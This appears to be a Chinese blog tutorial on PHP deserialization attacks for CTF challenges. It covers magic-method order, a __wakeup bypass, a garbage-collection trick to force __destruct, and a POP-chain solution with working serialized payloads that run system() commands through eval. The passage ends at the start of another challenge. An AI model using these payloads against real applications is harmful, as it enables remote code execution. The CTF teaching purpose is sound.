<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Archive</span> </span>{<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$game</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">launch</span>(<span class="hljs-variable">$this</span>-&gt;game);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"&lt;br&gt;hi&lt;br&gt;"</span>;<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Blue</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$welcome</span>=<span class="hljs-string">'蔚蓝档案启动器！&lt;br&gt;'</span></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$welcome</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'欢迎来到'</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">"&lt;br&gt;"</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    }<br>}<br></code></pre></td></tr></table></figure>
<p>在这里就是通过<code>Blue</code>类的<code>__toString()</code>方法，将<code>$this-&gt;str</code>传参一个<code>Archive</code>类的对象，调用其不存在的<code>source</code>属性来触发<code>__get()</code></p>
<h3 id="Triggering-Sequence"><a href="#Triggering-Sequence" class="headerlink" title="Triggering Sequence"></a>Triggering Sequence</h3><p>我们用下面这个简单的例子来看一下序列化与反序列化过程中，魔术方法的触发顺序</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cargo</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$secret</span> = <span class="hljs-string">"hi"</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dump</span> = <span class="hljs-string">"dump"</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"construct&lt;br&gt;"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"destruct&lt;br&gt;"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"call&lt;br&gt;"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"callStatic&lt;br&gt;"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"get&lt;br&gt;"</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"set&lt;br&gt;"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"isset&lt;br&gt;"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unset</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"unset&lt;br&gt;"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"sleep&lt;br&gt;"</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">"dump"</span>);<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"wakeup&lt;br&gt;"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"toString&lt;br&gt;"</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"toString"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"invoke&lt;br&gt;"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set_state</span>(<span class="hljs-params"><span class="hljs-variable">$properties</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"set_state&lt;br&gt;"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"clone&lt;br&gt;"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__debugInfo</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"debugInfo&lt;br&gt;"</span>;<br>    }<br>}<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;Serialize:&lt;br&gt;"</span>;<br><span class="hljs-variable">$cargo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cargo</span>;<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cargo</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;Unserialize:&lt;br&gt;"</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><code>output:</code></p>
<p><img src="..\img\php-unserialize\u1.png" alt="u1"></p>
<p>很显然，在<strong>序列化</strong>的过程中，依次触发了<code>__construct()</code>和<code>__sleep()</code>；而在<strong>反序列化</strong>的过程中，依次触发了<code>__wakeup()</code>，<code>__debugInfo()</code>和<code>destruct()</code>。最后多了一次<code>destruct</code>的输出是由于我们之前在序列化过程中创建的<code>cargo</code>对象在运行结束后也要进行一次析构函数的运行</p>
<h2 id="Ez-Bypass"><a href="#Ez-Bypass" class="headerlink" title="Ez Bypass"></a>Ez Bypass</h2><p>对于一些简单的题目，可能只利用了某些魔术方法的漏洞，并不需要进行<code>pop</code>链的构造</p>
<h3 id="wakeup-Bypass"><a href="#wakeup-Bypass" class="headerlink" title="__wakeup() Bypass"></a>__wakeup() Bypass</h3><ul>
<li><code>PHP5 &lt;5.6.25, PHP7 &lt; 7.0.10</code></li>
<li>如果类中存在<code>__wakeup()</code>方法，调用<code>unserilize()</code>方法前则先调用<code>__wakeup()</code>方法，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup()</code>的执行</li>
</ul>
<h3 id="destruct-Garbage-Collection"><a href="#destruct-Garbage-Collection" class="headerlink" title="__destruct() Garbage Collection"></a>__destruct() Garbage Collection</h3><p>先看看这个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cargo</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$secret</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;secret);<br>    }<br>}<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'str'</span>])){<br>    <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'str'</span>]);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"zako"</span>);<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>当我们构造序列化字符串<code>O:5:"Cargo":1:{s:6:"secret";s:13:"system('ls');";}</code>并传参时，就会得到以下结果</p>
<p><img src="..\img\php-unserialize\u2.png" alt="u2"></p>
<p>这是由于<code>__destruct()</code>是当某个对象成为垃圾或者当对象被显式销毁时执行</p>
<blockquote>
<p>显式销毁，当对象没有被引用时就会被销毁,所以我们可以<code>unset</code>或为其赋值<code>NULL</code><br>隐式销毁，<code>PHP</code>是脚本语言,在代码执行完最后一行时,所有申请的内存都要释放掉</p>
</blockquote>
<p>在常规思路中<code>__destruct()</code>是隐式销毁触发的，所以我们要强行使用<code>GC (Garbage Collection)</code></p>
<h4 id="What-is-Garbage-Collection"><a href="#What-is-Garbage-Collection" class="headerlink" title="What is Garbage Collection?"></a>What is Garbage Collection?</h4><p>垃圾回收，就是把内存中不需要使用的量给清除掉，收回它所占用的空间。</p>
<ul>
<li>旧的<code>GC</code>，在<code>PHP5.3</code>版本之前，使用的垃圾回收机制是单纯的“引用计数”。<ul>
<li>每个内存对象都分配一个计数器，当内存对象被变量引用时，计数器+1</li>
<li>当变量引用撤掉后，即执行<code>unset()</code>后，计数器-1</li>
<li>当计数器=0时，表明内存对象没有被使用，该内存对象则进行销毁，垃圾回收完成</li>
</ul>
</li>
</ul>
<p>这个时候就出现了问题，我自己引用我自己，自身一个，自己又被引用，所以计数器是2，但我将它销毁，才减1，此时明明已销毁，但还是1，所以无法进行回收，产生了内存泄漏。</p>
<ul>
<li>新的GC</li>
</ul>
<p>每个<code>PHP</code>变量存在一个叫<code>zval</code>的变量容器中。一个<code>zval</code>变量容器，除了包含变量的类型和值，还包括两个字节的额外信息。</p>
<p>第一个是<code>is_ref</code>，是个布尔值，用来标识这个变量是否是属于引用集合。通过这个字节，<code>PHP</code>引擎才能把普通变量和引用变量区分开来，由于<code>PHP</code>允许用户通过使用<code>&amp;</code>来使用自定义引用，<code>zval</code>变量容器中还有一个内部引用计数机制，来优化内存使用。</p>
<p>第二个额外字节是<code>refcount</code>，用以表示指向这个<code>zval</code>变量容器的变量个数。所有的符号存在一个符号表中，其中每个符号都有作用域。</p>
<h4 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h4><p>再回到刚刚那个例子，我们假如要执行<code>__destruct</code>方法，调用<code>eval()</code>，就得绕过这个<code>throw new Error</code>。因为<code>__destruct</code>方法是在该对象被回收时调用，而抛出错误会中断该进程对该对象的销毁。所以我们需要强制让GC去回收这个对象，方法就是反序列化一个数组，然后再利用第一个索引，来触发GC</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cargo</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$secret</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;secret = <span class="hljs-string">'system("ls")'</span>;<br>    }<br>}<br><br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cargo</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cargo</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">// output</span><br>a:<span class="hljs-number">2</span>:{i:<span class="hljs-number">0</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">"Cargo"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">6</span>:<span class="hljs-string">"secret"</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">"system("</span>ls<span class="hljs-string">")"</span>;}i:<span class="hljs-number">1</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">"Cargo"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">6</span>:<span class="hljs-string">"secret"</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">"system("</span>ls<span class="hljs-string">")"</span>;}}<br></code></pre></td></tr></table></figure>
<p>我们利用第一个索引，所以将后面改为第一个元素索引即可，也可以多加几个来进行触发。</p>
<p><code>Payload: a:2:{i:0;O:5:"Cargo":1:{S:6:"secret";s:13:"system('ls');";}i:0;i:0};}</code></p>
<p><img src="..\img\php-unserialize\u3.png" alt="u3"></p>
<h2 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h2><p>像上面的反序列化攻击更多的是魔术方法中出现一些利用的漏洞，如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来</p>
<h3 id="！动启，案档蓝蔚"><a href="#！动启，案档蓝蔚" class="headerlink" title="！动启，案档蓝蔚"></a>！动启，案档蓝蔚</h3><p>回顾一下招新赛的反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Archive</span> </span>{<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$game</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$game</span>=<span class="hljs-string">"总力战"</span></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;game=<span class="hljs-variable">$game</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"快去打"</span>.<span class="hljs-variable">$game</span>.<span class="hljs-string">"&lt;br&gt;"</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">launch</span>(<span class="hljs-params"><span class="hljs-variable">$what</span></span>)</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$what</span>.<span class="hljs-string">"启动！&lt;br&gt;"</span>;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$what</span>);<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">launch</span>(<span class="hljs-variable">$this</span>-&gt;game);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"&lt;br&gt;hi&lt;br&gt;"</span>;<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Blue</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$welcome</span>=<span class="hljs-string">'蔚蓝档案启动器！&lt;br&gt;'</span></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$welcome</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'欢迎来到'</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">"&lt;br&gt;"</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Printer</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$content</span>=<span class="hljs-string">"还想找大叔玩？&lt;br&gt;"</span></span>)</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"word count:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;content=<span class="hljs-variable">$content</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">print</span>();<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"word count:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>).<span class="hljs-string">"&lt;br&gt;"</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">print</span>();<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">print</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;content.<span class="hljs-string">"&lt;br&gt;"</span>;<br>    }<br>}<br><br><span class="hljs-variable">$what</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Blue</span>();<br><span class="hljs-variable">$is</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Printer</span>();<br><span class="hljs-variable">$it</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Archive</span>();<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'ba'</span>])){<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'ba'</span>]);<br>}<br><span class="hljs-keyword">else</span>{<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">"走错了捏&lt;br&gt;"</span>);<br>}<br></code></pre></td></tr></table></figure>
<p>首先扫一遍发现了利用点在<code>Archive</code> 类的<code>launch()</code>方法中的<code>eval($what)</code></p>
<blockquote>
<p>eval() 函数把字符串按照 PHP 代码来计算。</p>
</blockquote>
<p>继续观察，<code>launch()</code>方法在<code>__get()</code>方法中被调用</p>
<blockquote>
<p>魔术方法<code>__get()</code>用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</p>
</blockquote>
<p>观察发现可能是在<code>Blue</code>类中的<code>__toString()</code>方法，它返回了<code>$this-&gt;str-&gt;source</code>，那么我们就可以构造<code>str</code>为一个<code>Archive</code>对象，通过调用<code>Archive</code>中不存在的<code>$source</code>来成功调用<code>__get()</code>方法</p>
<blockquote>
<p>魔术方法<code>__toString()</code>在把类当作字符串使用时触发</p>
</blockquote>
<p>再次观察，在<code>Printer</code>类的<code>__construct()</code>方法中，它会将对象初始化时的传参<code>$content</code>在<code>strlen()</code>方法中被当做字符串调用，那么就可以成功调用<code>__toString()</code>方法</p>
<p>构造<code>payload</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// $c = new Archive("system('ls /');"); </span><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Archive</span>(<span class="hljs-string">"system('cat /flag');"</span>); <br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Blue</span>();<br><span class="hljs-variable">$b</span> -&gt; str = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Printer</span>();<br><span class="hljs-variable">$a</span> -&gt; content = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">// payload: O%3A7%3A%22Printer%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Blue%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A28%3A%22%E8%94%9A%E8%93%9D%E6%A1%A3%E6%A1%88%E5%90%AF%E5%8A%A8%E5%99%A8%EF%BC%81%3Cbr%3E%22%3Bs%3A3%3A%22str%22%3BO%3A7%3A%22Archive%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00game%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D%7D%7D</span><br></code></pre></td></tr></table></figure>
<h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 